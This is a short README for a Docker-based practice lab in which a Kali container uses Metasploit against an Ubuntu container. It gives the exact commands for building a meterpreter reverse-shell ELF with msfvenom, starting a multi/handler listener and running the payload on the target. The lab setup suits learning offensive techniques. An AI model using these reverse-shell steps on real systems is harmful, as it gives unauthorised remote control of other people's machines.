# hackali

## requirements

- Docker
- Docker Compose
- (Optional) Visual Studio Code
  - (Optional) Remote - Containers (extension)

## usage

### use Metasploit

```sh
# host
docker-compose up -d
docker-compose exec kali bash
```

```sh
# kali
cd /workspace/ubuntu
msfconsole
```

```
# kali (msfconsole)
msf5 > search type:payload reverse_tcp platform:linux arch:x64
msf5 > msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=kali lport=5555 -f elf -o revshell
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set lhost kali
msf5 exploit(multi/handler) > set lport 5555
msf5 exploit(multi/handler) > exploit
```

```sh
# host
docker-compose exec ubuntu bash
```

```sh
# ubuntu
cd /workspace
./revshell
```

### shutdown

```sh
# host
docker-compose down
```
